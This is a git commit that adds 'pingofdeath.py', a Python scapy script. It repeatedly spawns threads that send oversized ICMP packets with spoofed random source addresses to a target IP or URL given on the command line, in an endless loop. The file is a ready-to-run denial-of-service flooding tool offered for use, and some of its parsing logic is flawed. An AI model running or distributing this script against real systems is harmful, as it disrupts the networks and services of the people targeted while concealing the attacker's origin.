23f2dcf655785711f5d8ca3645c69ec29fc1eb26
Aiden Pearce <32305640+aidenpearce01@users.noreply.github.com>
2017-10-26 21:57:33 +0700

    Ping of Death
    Ping of Death

---
+++ Layer3-4/pingofdeath.py
@@ -0,0 +1,47 @@
+#!/usr/bin/env python
+#author Aiden
+
+from scapy.all import *
+import random , threading ,re ,sys 
+
+if len(sys.argv) != 2:
+	print "Usage: pingofdeath.py <target>"
+	sys.exit(1) 
+victim = sys.argv[1]
+
+class pingofdeath(threading.Thread):
+	try:
+		def check(self):
+			global target,victim
+			rep = victim.replace('.','')
+			check = rep.isdigit()
+			if check == True:
+				target = victim 
+			elif check == False and 'http'or'https' in victim:
+				if victim.count("/")==2:
+					victim = victim + "/"
+				m = re.search('(https?\://)?([^/]*)/?.*', victim)
+				host = m.group(2)
+				target = socket.gethostbyname(host)
+
+		def __init__(self):
+			threading.Thread.__init__(self)
+		def run(self):
+			self.check()
+			i = IP()
+			i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))	
+			randomip = i.src
+			ip_header = IP(src=i.src ,dst=target)
+
+			packet = ip_header/ICMP()/("m"*60000)
+			send(packet)
+
+			print "{0} ---ICMP---> {1}".format(randomip,target)
+	except KeyboardInterrupt:
+		sys.exit(1)
+	except:
+		print 'Victim not available!'
+		sys.exit(1)
+
+while True:
+	pingofdeath().start()
